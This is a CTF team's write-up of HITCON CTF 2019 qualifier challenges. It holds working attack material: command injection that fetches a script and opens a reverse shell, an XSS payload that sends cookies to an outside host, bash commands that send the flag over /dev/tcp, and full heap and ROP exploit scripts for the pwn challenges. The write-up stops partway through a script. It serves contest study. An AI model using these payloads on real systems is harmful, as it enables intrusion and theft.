# HITCON CTF 2019 Quals

**It's recommended to read our responsive [web version](https://balsn.tw/ctf_writeup/20191012-hitconctfquals/) of this writeup.**


 - [HITCON CTF 2019 Quals](#hitcon-ctf-2019-quals)
   - [Web](#web)
     - [Virtual Public Network](#virtual-public-network)
     - [Bounty Pl33z](#bounty-pl33z)
     - [GoGo PowerSQL](#gogo-powersql)
       - [Failed Attempts](#failed-attempts)
     - [Luatic](#luatic)
       - [Overwrite varibles](#overwrite-varibles)
       - [Redis and Lua](#redis-and-lua)
     - [Buggy .NET](#buggy-net)
   - [Pwn](#pwn)
     - [PoE - I](#poe---i)
     - [EmojiiiVM](#emojiiivm)
     - [Netatalk](#netatalk)
     - [<g-emoji class="g-emoji" alias="jack_o_lantern" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f383.png">🎃</g-emoji> Trick or Treat <g-emoji class="g-emoji" alias="jack_o_lantern" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f383.png">🎃</g-emoji>](#-trick-or-treat-)
     - [LazyHouse](#lazyhouse)
     - [One Punch Man](#one-punch-man)
     - [Crypto in the Shell](#crypto-in-the-shell)
   - [Misc](#misc)
     - [Revenge of Welcome](#revenge-of-welcome)
     - [EV3 Player](#ev3-player)
     - [heXDump](#hexdump)
     - [EmojiVM](#emojivm)
   - [Rev](#rev)
     - [EV3 Arm](#ev3-arm)
     - [EmojiVM](#emojivm-1)
     - [Core Dumb](#core-dumb)
     - [Suicune](#suicune)
   - [Crypto](#crypto)
     - [Lost Modulus Again](#lost-modulus-again)
     - [Lost Key Again](#lost-key-again)
     - [Very simple haskell](#very-simple-haskell)


## Web

### Virtual Public Network

`-r$x="wget kaibro.tw/yy -O /tmp/kaibro",system$x# 2>./tmp/kaibro.thtml <`

`-r$x="sh /tmp/kaibro",system$x# 2>./tmp/kaibro.thtml <`

then get reverse shell back.

`/$READ_FLAG$`

=> `hitcon{Now I'm sure u saw my Bl4ck H4t p4p3r :P}`

### Bounty Pl33z

This is a XSS challenge. The source code is [here](https://github.com/orangetw/My-CTF-Web-Challenges/blob/master/hitcon-ctf-2019/bounty-pl33z/www/fd.php). For quotes, if they appear more than once, they will be removed.

The most tricky part is if the string we inject includes a double quote. For example, `"+alert(1)`

```
window.parent.postMessage(
                data, 
"https://"+alert(1)".orange.ctf"
);
```

Undoubtedly the `orange.ctf"` will throw syntax error.

At that time, I could not come out of any useful payload to comment out `orange.ctf"`. Therefore I decided to fuzz/brute-force 3 characters:

```javascript
  for (let j = 0; j < 128; j++) {
    for (let k = 0; k < 128; k++) {
      for (let l = 0; l < 128; l++) {
        if (j == 34 || k ==34 || l ==34)
          continue;
        if (j == 0x0a || k ==0x0a || l ==0x0a)
          continue;
        if (j == 0x0d || k ==0x0d || l ==0x0d)
          continue;
        if (j == 0x3c || k ==0x3c || l ==0x3c)
          continue;
        if (
           (j == 47 && k == 47)
           ||(k == 47 && l == 47)
          )
          continue;
    try {
        var cmd = String.fromCharCode(j) + String.fromCharCode(k) + String.fromCharCode(l) + 'a.orange.ctf"';
        eval(cmd);
    } catch(e) {
        var err = e.toString().split('\n')[0].split(':')[0];
        if (err === 'SyntaxError' || err === "ReferenceError")
          continue
        err = e.toString().split('\n')[0]
    }
       console.log(err,cmd);
    }
    }
  }
```

The output really surprised me. The following are all valid js comment syntax:

```
#!a.orange.ctf"
-->a.orange.ctf"
```

The first [shebang syntax](https://github.com/tc39/proposal-hashbang) has to be in the start of the js, which means it is not very useful in this challenge.

However, the second one is interesting. This seems to be [a valid comment syntax](https://www.ecma-international.org/ecma-262/10.0/index.html#prod-annexB-HTMLCloseComment) in ECMA. Well.... it's javascript!

There is still one problem. The `-->` comment syntax must be the start of the line, but `\n\r` are all filtered. I start to wonder there exists an unicode newline or not, and I find this [stackoverflow](https://stackoverflow.com/questions/50156996/replace-n-with-unicode-to-display-new-line-in-html-correctly) post.

Anyway, let's fuzz/brute-force again!

```javascript
  for (let j = 0; j < 65536; j++) {
    try {
        var cmd = '"aaaaa";'+String.fromCharCode(j) + '-->a.orange.ctf"';
        eval(cmd);
    } catch(e) {
        var err = e.toString().split('\n')[0].split(':')[0];
        if (err === 'SyntaxError' || err === "ReferenceError")
          continue;
        err = e.toString().split('\n')[0]
    }
    console.log(`[${err}]`,j,cmd);
  }
```

`charCode(8233)` and `charCode(8233)` will be parsed as newline in javascript.

This payload can pop an alert: `http://3.114.5.202/fd.php?q="%2balert(1)%e2%80%a8-->`

The final payload:

```
http://3.114.5.202/fd.php?q=%22%2bfetch(atob(`Ly8xMzMuMjIxLjMzMy4xMjM6MTIzNC8/YT0K`)%2bbtoa(document%5B%60cookie%60%5D))%e2%80%a8--%3E
```
The flag is `hitcon{/FD 1s 0ur g0d <(_ _)>}`.

Actually, I was also playing with parentheses and template literal (backtick), but I failed to create a successful payload. To my surprise, there is actually an unintended solution exploiting parentheses. Check out [terjanq's](https://twitter.com/terjanq/status
/1183633977455861760) payload, or [this one](https://github.com/orangetw/My-CTF-Web-Challenges#unintended-solution).

Fun fact: The idea seems to be from a challenge in [Cure53 XSS wiki](https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml#level-8), and the first author [filedescriptor (fd)](https://twitter.com/filedescriptor) is working in Cure53.


### GoGo PowerSQL

The sever is running [GoAhead v4.0.0](https://github.com/embedthis/goahead) + CGI + mysql. The CGI program will read MySQL host ip from a config file, and there is a BSS overflow which we can overwrite the MySQL host ip. However, the characters are limited in alphabets only. Therefore we decided to exploit the webserver itself.

We checked the [CVE-2017-17562](https://github.com/embedthis/goahead/issues/262) on older GoAhead webservers. There is also a [good article](https://www.elttam.com.au/blog/goahead/) describing this vulnerability. Although it's fixed on 4.0.0, reading it should help me exploit this webserver. Surprising we found "the fix" was just [filtering a bunch of sensitive environment variables](https://github.com/embedthis/goahead/blob/32deeb00a106f3d1a7bdc21671123d97f05378b6/src/cgi.c#L168-L177).

However, the CGI executable uses `libmysqlclient`. It's possible that we can pollute some environment variable to reach RCE via mysql library. After browsing the [MySQL 5.7 doc](https://dev.mysql.com/doc/refman/5.7/en/environment-variables.html), one of them catches my eyes.

```
LIBMYSQL_PLUGINS 	Client plugins to preload.
```

And it turns out that it can load `.so` library as plugins. I quickly made a simple RCE hook in C:

```
// gcc -shared -fPIC cmd.c -o cmd.so

#define _GNU_SOURCE

#include <stdlib.h>
#include <stdio.h>
#include <string.h>


extern char** environ;

__attribute__ ((__constructor__)) void preload (void)
{
    system(getenv("CMD"));
}
```

We can easily RCE through the commands. Basically it's similar to `LD_PRELOAD`.

```
CMD="yes" LIBMYSQL_PLUGIN_DIR=`pwd` LIBMYSQL_PLUGINS="cmd.so" QUERY_STRING="name=a" ./query
```
(`QUERY_STRING` is the GET parmeters passing to the CGI executable `query`)


Also, based on the exploit of [CVE-2017-17562](https://www.elttam.com.au/blog/goahead/), we could probably use `/proc/self/fd/0` to upload our malicious library.

However, MySQL library will always append `.so` on the name of plugins. So if the plugin is named `foo`, it will load `foo.so` from the directory specified. We stuck here for a few hours and we can't find a way to bypass this.

Until I read [mysql source code](https://github.com/mysql/mysql-server/blob/4869291f7ee258e136ef03f5a50135fe7329ffb9/sql-common/client_plugin.cc#L442):

```cpp
int FN_REFLEN = 512;
char dlpath[FN_REFLEN + 1];
strxnmov(dlpath, sizeof(dlpath) - 1, plugindir, "/", name, ".so", NullS);

char *strxnmov(char *dst, size_t len, const char *src, ...) {
  va_list pvar;
  char *end_of_dst = dst + len;

  va_start(pvar, src);
  while (src != NullS) {
    do {
      if (dst == end_of_dst) goto end;
    } while ((*dst++ = *src++));
    dst--;
    src = va_arg(pvar, char *);
  }
end:
  *dst = 0;
  va_end(pvar);
  return dst;
}
```

Thanks to this, if the filepath is more than 512 bytes, `.so` will get truncated.

```shell
curl -X POST --data-binary @./cmd.so 'http://13.231.38.172/cgi-bin/query?LIBMYSQL_PLUGIN_DIR=//proc/self/fd&LIBMYSQL_PLUGINS=././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././0&CMD=bash%20-c%20%22cat%20/F*>/dev/tcp/133.221.333.123/12345%22'
```

The flag: `hitcon{Env1r0nm3nt 1nj3ct10n r0cks!!!}`

This seems to be the unintended RCE solution (I knew some other teams also developed this exploit.). According to [the author's writeup (Orange)](https://github.com/orangetw/My-CTF-Web-Challenges#gogo-powersql), the intended way is polluting `LOCALDOMAIN` and overwriting mysql host to read arbitrary file from the client using a rogue MySQL server.

Everything is possible if you check the source code.


#### Failed Attempts
- snprintf overwrite: The SQL query is built using snprintf, but we can overwrite the last single quote here. The query will become `select * from users where name like '%aaaaaa%` which leads to SQL error. However, this is useless......
- Using GoAhead 1-day or CVEs: like embedthis/goahead Issue [264](https://github.com/embedthis/goahead/issues/264) and [285](https://github.com/embedthis/goahead/issues/285), but I feel like they are not actually exploitable. (and I don't have any pwn skills)
- brute-force the temp filename to become `foobar.so`: The webserver will create a tempfile for stdio/out. However, the filename, especially the extension, is not controllable. Check the [source code](https://github.com/embedthis/goahead/blob/029ea72c871f1dced9e9a7bd1ff9cc0a003fd4ca/src/osdep.c#L66) here.
- Using existing library `*.so` on the server with environment variables to RCE: The only interesting library is `libmemusage`. Loading this library shows the memory usage of the program. However they don't seem to be useful here.

### Luatic

The server source code is [here](https://github.com/orangetw/My-CTF-Web-Challenges/blob/master/hitcon-ctf-2019/luatic/luatic.php).

Each team in this CTF will be assigned a unique token, which can be used in this challenge to create an independent Redis server.

#### Overwrite varibles

The first part is to overwrite PHP varibles. Let's focus on this code:

```php
    foreach($_REQUEST as $k=>$v) {
        if( strlen($k) > 0 && preg_match('/^(FLAG|MY_|TEST_|GLOBALS)/i',$k)  )
            exit('Shame on you');
    }
    
    foreach(Array('_GET','_POST') as $request) {
        foreach($$request as $k => $v) ${$k} = str_replace(str_split("[]{}=.'\""), "", $v);
    }
```

It will extract GET and POST parameters and simply create a PHP varaible and assign to it. However, the annoying WAF will block any attempt to create any varaible starting with `MY_`. @kaibro found the trick here: the for-each loop firstly parses `_GET` and then `_POST`. What if we name our varaible as `_POST` and put it in `_GET`? It will parse this one in `_GET`  and add our varaible into `_POST`!

```
example.com/?_POST[guess]=123

# First, parse $_GET
$_POST = Array("guess" => 123);

# Second, parse $_POST, which has been overwritten previously
$guess = 123;
```


[Reference (in Simplified Chinese)](https://xz.aliyun.com/t/5676#toc-4).

#### Redis and Lua

Thus, we can control the `$MY_SET_COMMAND` now. The next target is the redis server and Lua interpreter. We have to somehow find an approach to predict the random value.

The PHP code seems to use [phpredis](https://github.com/phpredis/phpredis) library. We could probably inject command in `rawCommand` function call, but our objective is in the Lua interpreter.

Let's gather some information for this Lua interpreter in Redis.

1. [Redis uses the same Lua interpreter to run all the commands.](https://redis.io/commands/eval#atomicity-of-scripts) 
2. sandboxing: Lua interpreter in Redis [is sandboxed](https://redis.io/commands/eval#sandbox-and-maximum-execution-time). The [available modules](https://redis.io/commands/eval#available-libraries) are pretty limited. RCE will be difficult.
3. [replication](https://redis.io/commands/eval#scripts-as-pure-functions): The Lua script has to be a stateless pure function. It should not depend on any internal state. Basically what redis want is the Lua script should return the same value for each call.
4. [not allow global varaibles](https://redis.io/commands/eval#global-variables-protection): This is a similar mechanism as the previous one. You should not keep state inside the Lua engine.

Even with those limitations, we still try to overwrite `math.random` function call. After some searching I got [this](https://stackoverflow.com/questions/19997647/script-attempted-to-create-global-variable), so I think if it's possible to create a global variable, it should not be hard to overwrite one.

Therefore, we just overwrite `math.random` like this in redis.

```
eval "function math:random() return 87 end" 0
```

Here is the final payload. Because the server will check if the key exists in redis or not, we have to set that one in redis first:

```
http://54.250.242.183/luatic.php?token=mytoken&_POST[guess]=87&_POST[TEST_KEY]=function%20math%3Arandom()%20return%2087%20end&_POST[TEST_VALUE]=0
```

Then overwrite the function. The return value will be fixed.

```
http://54.250.242.183/luatic.php?token=052e31ea-dc02-48ea-8e76-e277c4b03c60&_POST[guess]=87&_POST[MY_SET_COMMAND]=eval&_POST[TEST_KEY]=function%20math%3Arandom()%20return%2087%20end&_POST[TEST_VALUE]=0
```

Flag: `hitcon{Lua^H Red1s 1s m4g1c!!!}`


### Buggy .NET

flag is in the `C:\FLAG.txt`

Thus we need to bypass `..` restriction to read files.

And in one year ago, I have read @irsdl's .NET WAF Bypass slide: https://www.slideshare.net/SoroushDalili/waf-bypass-techniques-using-http-standard-and-web-servers-behaviour

The example code in the slide is almost same as this challenge. 

We just need to throw an exception when we use `Request.Form["filename"]` first time.

But I tried a lot of charset tricks (IBM500, IBM037, ...) and it never throw any exception.

So I started to read the .NET source code, and I found that we should use some malicious payload (e.g. XSS) to trigger the Request Validation exception.

(The function calling chain looks like: `Form.get` -> `ValidateHttpValueCollection` -> `collection.EnableGranularValidation` -> `ValidateString` -> `RequestValidator.Current.IsValidRequestString` -> `rossSiteScriptingValidation.IsDangerousString` -> `throw new HttpRequestValidationException`)

And it validated the Form data only once, so it will not throw any exception when we called it in the second time.

```
public NameValueCollection Form {
    get {
        EnsureForm();

        if (_flags[needToValidateForm]) {
            _flags.Clear(needToValidateForm);
            ValidateHttpValueCollection(_form, RequestValidationSource.Form);
        }

        return _form;
    }
}
```

Here is my exploit script:

```python
from pwn import *
import urllib

encoding = "utf-8"

r = remote("52.197.162.211", 80)

s = 'filename'
print(s)
res1 = (urllib.quote_plus(s.encode(encoding)))
l1 = len(res1)

#s = 'web.config'
s = '../../../../FLAG.txt'
print(s)
res2 = (urllib.quote_plus(s.encode(encoding)))
l2 = len(res2)

print(res1 + "=" + res2)
print("Length: ", l1 + l2 + 1)

s = "<script>alert(123)</script>"
shit = "&x=" + urllib.quote_plus(s.encode(encoding))

payload = '''GET / HTTP/1.1
Host: 52.197.162.211
Content-Type: application/x-www-form-urlencoded
Content-Length: {}

{}'''.format(l1 + l2 + 1 + len(shit), res1 + "=" + res2 + shit).replace("\n", "\r\n")


r.send(payload)

r.interactive()
```

`hitcon{Amazing!!! @irsdl 1s ind33d the .Net KING!!!}`

## Pwn

### PoE - I

* https://github.com/yuawn/CTF/blob/master/2019/hitcon/PoE/poe-I.py


### EmojiiiVM
* https://github.com/yuawn/CTF/tree/master/2019/hitcon/EmojiiiVM

```python=
#!/usr/bin/env python3
#from pwn import *
import re

# hitcon{H0p3_y0u_Enj0y_pWn1ng_th1S_3m0j1_vM_^_^b}

'''
store [i] [j] [top]
load  top = mem[i][j]
'''

num = [ '😀' , '😁', '😂' , '🤣' , '😜' , '😄' , '😅' , '😆' , '😉' , '😊' , '😍' ]

def push( n ):
    if n <= 10:
        return '⏬' + num[n]
    else:
        return  mul( n // 10 , 10 ) + add( n % 10 , -1 )

def add( a , b , top = False ):
    if b < 0:
        return push( a ) + '➕'
    else:
        return push( b ) + push( a ) + '➕'

def sub( a , b ):
    if b == -1:
        return push( b ) + push( a ) + '➖'
    return push( b ) + push( a ) + '➖'

def mul( a , b ):
    if b == -1:
        return push( a ) + '❌'
    return push( b ) + push( a ) + '❌'

def store( i , j , v ):
    if v == -1:
        return push(j) + push(i) + '📥'
    if type(v) == type('y'):
        v = ord( v )
    return push(v) + push(j) + push(i) + '📥'

def load( i , j ):
    return push(j) + push(i) + '📤'

now = '\0' * 10

def store_str( i , s ):
    p = ''
    for j in range( len( s ) ):
        if now[j] == s[j]:
            continue
        p += store( i , j , s[j] )
    return p

def read( i ):
    return push( i ) + '📄'

def wri( i ):
    return push( i ) + '📝'

pop = '🔝'
wri_stk = '🔡'
puti = '🔢'

p = ''
p += ( push( 10 ) + '🆕' ) * 6
p += '➕'
p += pop * 9
p += add( 10 , -1 ) * 15 # 3 control 1
p += add( 2 , -1 )
p += pop * 20
p += puti
p += read( 3 )
p += read( 1 )
p += push( 10 ) + '🆕'
p += '🛑'

o = open( 'exp' , 'w+' )
o.write( p )
o.close()
```

### Netatalk


```python=
from pwn import *
import struct

#context.log_level = "error"
#ip = 'localhost'
ip = '3.114.63.117'
port = 48763
def create_header(addr):
    dsi_opensession = "\x01" # attention quantum option
    dsi_opensession += chr(len(addr)+0x10) # length
    dsi_opensession += "b"*0x10+addr
    dsi_header = "\x00" # "request" flag
    dsi_header += "\x04" # open session command
    dsi_header += "\x00\x01" # request id
    dsi_header += "\x00\x00\x00\x00" # data offset
    dsi_header += struct.pack(">I", len(dsi_opensession))
    dsi_header += "\x00\x00\x00\x00" # reserved
    dsi_header += dsi_opensession
    return dsi_header

def create_afp(idx,payload):
    afp_command = chr(idx) # invoke the second entry in the table
    afp_command += "\x00" # protocol defined padding 
    afp_command += payload
    dsi_header = "\x00" # "request" flag
    dsi_header += "\x02" # "AFP" command
    dsi_header += "\x00\x02" # request id
    dsi_header += "\x00\x00\x00\x00" # data offset
    dsi_header += struct.pack(">I", len(afp_command))
    dsi_header += '\x00\x00\x00\x00' # reserved
    dsi_header += afp_command
    return dsi_header

#addr = p64(0x7f9159232000-0x5357000)[:6] # brutefore address
addr = p64(0x7f812631d000)[:6]
#addr = ""
while len(addr)<6 :
    for i in range(256):
        r = remote(ip,port)
        r.send(create_header(addr+chr(i)))
        try:
            if "a"*4 in r.recvrepeat(1):
                addr += chr(i)
                r.close()
                break
        except:
            r.close()
    val = u64(addr.ljust(8,'\x00'))
    print hex(val)
addr += "\x00"*2
offset = 0x5246000
r = remote(ip,port)
libc = u64(addr)+offset
#libc=0x7fea3340b120-0x43120 # local libc offset
#print hex(libc)
#print hex(libc+0x3ed8e8)
#print hex(libc+0x3f04a8) # dl_open_hook
#print hex(libc+0x7EA1F)
#print hex(libc+0x166488)
#print hex(libc+0x4f440)
#raw_input()
#libc=0x7fea3340b120-0x43120
#setcontext+53



r.send(create_header(p64(libc+0x3ed8e8-0x30))) #  overwrite afp_command buf with free_hook-0x30 
context.arch = "amd64"

r8=0
r9=1
r12=1
r13=1
r14=1
r15=1
rdi=libc+0x3ed8e8+8 # cmd buffer
rsi=0x1111
rbp=0x1111
rbx=0x1111
rdx=0x1211
rcx=0x1211
rsp=libc+0x3ed8e8
rspp=libc+0x4f440 # system
payload2=flat(
r8,r9,
0,0,r12,r13,r14,r15,rdi,rsi,rbp,rbx,rdx,0,rcx,rsp,rspp
)
rip="X.X.X.X"
rport=11112
cmd='bash -c "cat /home/ctf/flag > /dev/tcp/%s/%d" \x00' % (rip,rport) # cat flag to controled ip and port 
payload = flat("\x00"*0x2e+p64(libc+0x166488)+cmd.ljust(0x2bb8,"\x00")+p64(libc+0x3f04a8+8)+p64(libc+0x7EA1F)*4+p64(libc+0x52070+53)+payload2) #over write _free_hook and _dl_open_hook
r.send(create_afp(0,payload))
r.send(create_afp(18,flat(
    ""
)))
        

r.interactive()
```
### 🎃 Trick or Treat 🎃
```python
from pwn import *

#r = process(["./trick_or_treat"])

r = remote("3.112.41.140", 56746)
r.sendlineafter(":",str(0x1000000))
r.recvuntil(":")
libc = int(r.recvline(),16)+0x1000ff0
print hex(libc)
offset = 0x1000ff0
r.sendlineafter(":",hex((offset+0x3ed8e8)/8))
r.sendline(" "+hex(libc+0x4f440))
r.sendafter(":","a"*0x400)
r.sendline("")
r.sendline("ed")
r.sendline("!sh")
r.interactive()
```

### LazyHouse
```python
from pwn import *

#r = process(["./lazyhouse"])
r = remote("3.115.121.123", 5731)
def buy(idx,size,house):
    r.sendlineafter(":","1")
    r.recvuntil(":")
    r.sendlineafter(":",str(idx))
    r.sendlineafter(":",str(size))
    r.recvuntil(":")
    if size < 0xffffffff:
        r.sendafter(":",house)

def show(idx):
    r.sendlineafter(":","2")
    r.sendlineafter(":",str(idx))

def remove(idx):
    r.sendlineafter(":","3")
    r.sendlineafter(":",str(idx))


def Upgrade(idx,house):
    r.sendlineafter(":","4")
    r.sendlineafter(":",str(idx))
    r.sendafter(":",house)

def Super(house):
    r.sendlineafter(":","5")
    r.sendafter(":",house)



buy(0,84618092081236480,"a")
remove(0)
buy(0,0x80,"a")
buy(1,0x500,"a")
buy(2,0x80,"a")
remove(1)
buy(1,0x600,"a")
Upgrade(0,"\x00"*0x88+p64(0x513))
buy(7,0x500,"a")
show(7)
data = r.recvn(0x500)
libc =  u64(data[0x8:0x10])-0x1e50d0
heap = u64(data[0x10:0x18])-0x2e0
print hex(libc)
print hex(heap)

remove(0)
remove(1)
remove(2)
size = 0x1a0+0x90
target = heap+0x8b0
buy(6,0x80,"\x00"*8+p64(size+1)+p64(target-0x18)+p64(target-0x10)+p64(target-0x20))
buy(5,0x80,"a")
buy(0,0x80,"a")
buy(1,0x80,"a")
buy(2,0x600,"\x00"*0x508+p64(0x101))
Upgrade(1,"\x00"*0x80+p64(size)+p64(0x610))
remove(2)
context.arch = "amd64"
size = 0x6c0
buy(2,0x500,"\x00"*0x78+flat(size+1,[0]*17)+
        flat(0x31,[0]*5,0x61,[0]*11,0x21,[0]*3,0x71,[0]*13))
remove(0)
remove(1)
remove(2)


buy(0,0x1a0,p64(0)*15+p64(0x6c1))
buy(1,0x210,"a")

buy(2,0x210,"a")
remove(2)
buy(2,0x210,"\x00"*0x148+p64(0xd1))
remove(2)
for i in range(5):
    buy(2,0x210,"a")
    remove(2)

buy(2,0x3a0,"a")
remove(2)


remove(1)
buy(1,0x220,"a")
remove(5)
buy(5,0x6b0,"\x00"*0xa0+p64(heap+0x40)+"\x00"*0x80+p64(0x221)+p64(libc+0x1e4eb0)+p64(heap+0x40))
remove(1)
buy(1,0x210,"a"*0x18+flat(
"/home/lazyhouse/flag".ljust(0x20,"\x00"),
libc+0x26542,heap+0xa88-0x20,libc+0x26f9e,0,libc+0x47cf8,2,libc+0x00cf6c5,
libc+0x26542,0x3,libc+0x26f9e,heap,libc+0x12bda6,0x100,libc+0x47cf8,0,libc+0x00cf6c5,
libc+0x26542,0x1,libc+0x26f9e,heap,libc+0x12bda6,0x100,libc+0x47cf8,1,libc+0x00cf6c5,
libc+0x36784
))
buy(2,0x210,p64(0)*0x20+p64(libc+0x1e4c30))
Super(p64(libc+0x0058373)+"z"*0x200)
remove(1)

buy(1,heap+0xa80,"a")

r.interactive()
```

### One Punch Man
```python=
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import sys
import time
import random
host = '52.198.120.1'
port = 48763

binary = "./one_punch"
context.binary = binary
elf = ELF(binary)
try:
  libc = ELF("./libc.so.6")
  log.success("libc load success")
  system_off = libc.symbols.system
  log.success("system_off = "+hex(system_off))
except:
  log.failure("libc not found !")

def name(index, name):
  r.recvuntil("> ")
  r.sendline("1")
  r.recvuntil(": ")
  r.sendline(str(index))
  r.recvuntil(": ")
  r.send(name)
  pass

def rename(index,name):
  r.recvuntil("> ")
  r.sendline("2")
  r.recvuntil(": ")
  r.sendline(str(index))
  r.recvuntil(": ")
  r.send(name)

  pass

def d(index):
  r.recvuntil("> ")
  r.sendline("4")
  r.recvuntil(": ")
  r.sendline(str(index))
  pass

def show(index):
  r.recvuntil("> ")
  r.sendline("3")
  r.recvuntil(": ")
  r.sendline(str(index))

def magic(data):
  r.recvuntil("> ")
  r.sendline(str(0xc388))
  time.sleep(0.1)
  r.send(data)

if len(sys.argv) == 1:
  r = process([binary, "0"], env={"LD_LIBRARY_PATH":"."})

else:
  r = remote(host ,port)

if __name__ == '__main__':
  name(0,"A"*0x210)
  d(0)
  name(1,"A"*0x210)
  d(1)
  show(1)
  r.recvuntil(" name: ")
  heap = u64(r.recv(6).ljust(8,"\x00")) - 0x260
  print("heap = {}".format(hex(heap)))
  for i in xrange(5):
    name(2,"A"*0x210)
    d(2)
  name(0,"A"*0x210)
  name(1,"A"*0x210)
  d(0)
  show(0)
  r.recvuntil(" name: ")
  libc = u64(r.recv(6).ljust(8,"\x00")) - 0x1e4ca0
  print("libc = {}".format(hex(libc)))
  d(1)
  rename(2,p64(libc + 0x1e4c30))

  name(0,"D"*0x90)
  d(0)
  for i in xrange(7):
    name(0,"D"*0x80)
    d(0)
  for i in xrange(7):
    name(0,"D"*0x200)
    d(0)


  name(0,"D"*0x200)
  name(1,"A"*0x210)
  name(2,p64(0x21)*(0x90/8))
  rename(2,p64(0x21)*(0x90/8))
  d(2)
  name(2,p64(0x21)*(0x90/8))
  rename(2,p64(0x21)*(0x90/8))
  d(2)



  d(0)
  d(1)
  name(0,"A"*0x80)
  name(1,"A"*0x80)
  d(0)
  d(1)
  name(0,"A"*0x88 + p64(0x421) + "D"*0x180 )
  name(2,"A"*0x200)
  d(1)
  d(2)
  name(2,"A"*0x200)
  rename(0,"A"*0x88 + p64(0x421) + p64(libc + 0x1e5090)*2 + p64(0) + p64(heap+0x10) )
  d(0)
  d(2)
  name(0,"/home/ctf/flag\x00\x00" + "A"*0x1f0)
  magic("A")
  add_rsp48 = libc + 0x000000000008cfd6
  pop_rdi = libc + 0x0000000000026542
  pop_rsi = libc + 0x0000000000026f9e
  pop_rdx = libc + 0x000000000012bda6
  pop_rax = libc + 0x0000000000047cf8
  syscall = libc + 0xcf6c5
  magic( p64(add_rsp48))
  name(0,p64(pop_rdi) + p64(heap + 0x24d0) + p64(pop_rsi) + p64(0) + p64(pop_rax) + p64(2) + p64(syscall) +
      p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(heap) + p64(pop_rdx) + p64(0x100) + p64(pop_rax) + p64(0) + p64(syscall) +
      p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(heap) + p64(pop_rdx) + p64(0x100) + p64(pop_rax) + p64(1) + p64(syscall)
      )
r.interactive()

```


### Crypto in the Shell

```python=
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from Crypto.Cipher import AES
from pwn import *
import sys
import time
import random
host = '3.113.219.89'
port = 31337

binary = "./chall"
context.binary = binary
elf = ELF(binary)
try:
  libc = ELF("./libc.so.6")
  log.success("libc load success")
  system_off = libc.symbols.system
  log.success("system_off = "+hex(system_off))
except:
  log.failure("libc not found !")

def e(offset,size):
  r.recvuntil("ffset:")
  r.sendline(str(offset))
  r.recvuntil(":")
  r.sendline(str(size))
  pass

if len(sys.argv) == 1:
  r = process([binary, "0"], env={"LD_LIBRARY_PATH":"."})

else:
  r = remote(host ,port)

if __name__ == '__main__':
  e(-32,15) # overwirte key & get key
  key = r.recv(16)
  aes = AES.new(key, AES.MODE_CBC, "\x00"*16)

  e(-64,15) # leak libc
  sec = r.recv(16)
  data = aes.decrypt(sec)
  libc = u64(data[:8].ljust(8,"\x00")) - 0x3ec680
  print("libc = {}".format(hex(libc)))
  e(-928,15) # leak code
  sec = r.recv(16)
  aes = AES.new(key, AES.MODE_CBC, "\x00"*16)
  data = aes.decrypt(sec)
  print repr(data)
  code = u64(data[8:].ljust(8,"\x00")) - 8 + 0x3A0
  print("code = {}".format(hex(code)))
  env_ptr = libc + 0x3ee098
  e(env_ptr - code, 15) # leak stack
  sec = r.recv(16)
  aes = AES.new(key, AES.MODE_CBC, "\x00"*16)
  data = aes.decrypt(sec)
  print repr(data)
  #stack = u64(data[:8].ljust(8,"\x00")) # local
  stack = u64(data[:8].ljust(8,"\x00")) + 8  # remote
  print("stack = {}".format(hex(stack)))
  wanto = stack - 0x130
  e(wanto-code,1) # overwrite loop i (bypass 32 round)

  magic = p64(libc + 0x4f2c5)

  for i in xrange(8): # modify retrun address to one_gadget
    print i
    wanto = stack - 0xf8 + i
    e(wanto-code,1)
    sec = r.recv(16)
    j=0
    while 1:
      aes = AES.new(key, AES.MODE_CBC, "\x00"*16)
      sec = aes.encrypt(sec)
      j+=1
      if sec[0] == magic[i]:
        for k in xrange(j):
          r.sendline(str(wanto-code))
          r.sendline(str(1))
        for k in xrange(j):
          r.recvuntil("ffset:")
        break
  for i in xrange(8): # modify envrion ptr to null
    print i
    wanto = env_ptr + i
    e(wanto-code,1)
    sec = r.recv(16)
    j=0
    while 1:
      aes = AES.new(key, AES.MODE_CBC, "\x00"*16)
      sec = aes.encrypt(sec)
      j+=1
      if sec[0] == '\x00':
        for k in xrange(j):
          r.sendline(str(wanto-code))
          r.sendline(str(1))
        for k in xrange(j):
          r.recvuntil("ffset:")
        break
  r.sendline("l") # exit main
  r.sendline("ls") # get shell
  r.interactive()

```

## Misc

### Revenge of Welcome

The challenge is to escape vim easy mode

`<C-l>:q!`
`<C-o>:q!`

flag : `hitcon{accidentally enter vim -y and can't leave Q_Q}`

### EV3 Player

Use wireshark to open the pklg file.

And install this plugin in wireshark.
https://github.com/ev3dev/lms-hacker-tools/tree/master/EV3

You would see these rsf file in the pklg.

```
../prjs/SD_Card/project/fl.rsf
../prjs/SD_Card/project/ag.rsf
```

Extract these two rsf from the pklg(I complete this step manually)

Install the LEGO Mindstorms to open the rsf sound file.

https://education.lego.com/en-us/downloads/mindstorms-ev3/software

![](https://i.imgur.com/hstSAQH.png)

And you can hear the flag:

`hitcon{playsoundwithlegomindstormsrobot}`



### heXDump

```
IO.popen("xxd -r -ps - #{@file}", 'r+') do |f|
    f.puts data
    f.close_write
  end
```

xxd didn't clear the original data, we can leak the flag one byte by one byte.

```python
#!/usr/bin/env python3
from pwn import *
import string

context.log_level = 'CRITICAL'

def cmd(x, data = None):
    global r

    while True:
        try:
            r.sendlineafter('0) quit\n', str(x))
            if x == 1 and data:
                r.sendlineafter('Data? (In hex format)\n', data.hex())
            elif x == 2:
                return r.recvline().strip()
            elif x == 3 and data:
                r.sendlineafter('- AES\n', data)
            return
        except EOFError:
            r = remote('13.113.205.160', 21700)
            mode('aes')
            copyflag()

def read():
    return cmd(2)

def write(data):
    cmd(1, data)

def mode(data):
    cmd(3, data)

def copyflag():
    cmd(1337)

r = remote('13.113.205.160', 21700)
mode('aes')
copyflag()

flag = b''

for block in range(2):
    checks = [read()]
    for i in range(1, 16):
